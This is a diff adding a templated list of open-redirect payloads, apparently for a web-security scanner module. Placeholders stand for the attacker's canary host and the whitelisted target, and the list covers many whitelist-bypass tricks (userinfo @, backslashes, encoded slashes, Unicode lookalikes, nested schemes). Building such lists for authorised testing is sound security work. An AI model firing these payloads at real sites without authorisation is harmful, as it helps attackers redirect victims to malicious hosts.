@@ -1,0 +1,91 @@
+# Open-redirect payloads. {C} = canary host (attacker), {H} = target host (whitelist).
+# Folded from Cujanovic's list + the user's methodology. Injected raw as the param value.
+# javascript:/data: payloads are intentionally excluded here (they belong to the XSS module).
+
+# --- basic ---
+https://{C}
+https://{C}/
+http://{C}
+//{C}
+//{C}/
+///{C}
+////{C}
+https:/{C}
+https:{C}
+//{C}//
+/{C}
+
+# --- backslash / autocorrect ---
+/\{C}
+/\/{C}
+\/\/{C}
+\\{C}
+//{C}\@{H}
+https:\\{C}
+https:/\/\{C}
+https://{C}\@{H}
+
+# --- tab / %09 / %5c ---
+/%09/{C}
+//%09/{C}
+///%09/{C}
+////%09/{C}
+/%5c{C}
+//%5c{C}
+///%5c{C}
+////%5c{C}
+https://%09/{C}
+https://%5c{C}
+
+# --- @ userinfo tricks (whitelist bypass) ---
+https://{H}@{C}
+https://{H}@{C}/
+//{H}@{C}/
+//{H}@{C}//
+http://{H}@{C}
+https://:@{C}\@{H}
+http://{C}:80#@{H}/
+http://{C}:80?@{H}/
+http://{H}&{C}
+//www.{H}@{C}/
+//{H}@{C}/%2f..
+
+# --- path traversal inside host ---
+//{C}/%2f..
+//{C}/%2e%2e
+//{C}/%2e%2e%2f
+//{C}/%2f%2e%2e
+////{C}/%2f..
+///{C}//
+/https://{C}/
+/https://{C}/%2f..
+/https:///{C}/%2f%2e%2e
+
+# --- nested scheme ---
+//https://{C}//
+//https:///{C}/%2e%2e
+/https://{H}@{C}
+https://{H}/https://{C}/
+
+# --- unicode dot / slash lookalikes ---
+//{C}%E3%80%82com
+//{C}%00.com
+//{C}%00.{H}
+/〱{C}
+/ー{C}
+<>//{C}
+
+# --- encoded ---
+https://{C}%2f%2e%2e
+/%2f{C}
+%2f%2f{C}
+https://{H}%2f@{C}
+https://{H}%252f@{C}
+https://{H}%252f@{C}/{H}
+
+# --- fragment / query confusion ---
+https://{C}#{H}
+https://{C}?{H}
+https://{C}#.{H}
+http://{H}?http://{C}/
+https://{C}&{H}
